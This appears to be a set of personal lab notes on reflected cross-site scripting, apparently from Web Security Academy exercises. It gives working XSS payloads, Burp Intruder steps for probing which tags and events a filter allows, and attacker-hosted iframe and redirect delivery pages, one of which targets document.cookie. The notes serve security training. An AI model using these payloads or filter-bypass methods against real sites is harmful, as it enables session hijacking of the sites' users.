
[ WEB > XSS > REFLECTED ]

// classic....
<script>alert(1)</script>

===

// test user input.
// determine input is reflected inside a quoted attribute...
// <input type="text" placeholder="Search the blog..." name="search" value="test123">
// let the hacking begin... lol
"onmouseover="alert(1)

// results in:
// <input type="text" placeholder="Search the blog..." name="search" value=""onmouseover="alert(1)">
// and for some reason, no space is required between attributes after quote...

===

// in this case, user input gets reflected in javascript in the source.
// e.g.,
// <script>
//   var searchTerms = 'test123';
//   document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
// </script>
// inject directly into the script:
'-alert(1)-'

// results in:
var searchTerms = ''-alert(1)-'';

===

// try a standard vector...
<img src=1 onerror=print()>

// it gets blocked...
// use burp intruder to test a wide variety of tags and see what is allowed
// list can be found here:
// https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
// the intruder payload should look like:
GET /?search=<§§> HTTP/2

// we see that "body" and "custom tags" are allowed...
// now we'll use intruder again to test event payloads to see what is allowed:
// use the list from the same cheet sheet above...
<body%20§§=1>

// there are a number of payloads (events) that are allowed.
// let's use the onresize event.
// we craft our payload.
// we embed this on our own web server and try to get the victim to visit it.
// if the victim visits our page,
// the iframe loads the target site along with the xss payload
// since we control the iframe, we resize it, which triggers onresize
// and javascript excutes on the client for the target website.
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search="><body onresize=print()>" onload=this.style.width='100px'>

// url encode relevant chars:
// need this to prevent problems with quotes, etc.
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>

===

// all tags except custom ones are blocked.
// example payload for this scenario:
<script>
location = 'https://0ac800d20360cbfda1658ba600ba007b.web-security-academy.net/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
</script>

// in the above, a custom tag is used to create an element with an id=x
// #x is appended to url that victim is redirected to in order to focus on element
// and trigger code.
// note: this is hosted on your attacker infra.
// link to the hosted page is delivered to the victim.
// url encode the payload, then deliver it:
<script>
location = 'https://0ac800d20360cbfda1658ba600ba007b.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>

===

// standard payload gets blocked:
<img src=1 onerror=alert(1)>

// use burp intruder to test a list of any tags that are allowed (return 200)
// we determine that svg is allowed, in addition to animatetransform.
// we mold out our payload and then test any allowed events for the tag
// using burp intruder again with the events list for brute force.
<svg><animatetransform%20§§=1>

// turns out onbegin event is allowed.
// use that to finish creating the working payload.
// apparently, onbegin triggers when an animated svg begins playing.
<svg><animatetransform onbegin=alert(1)>




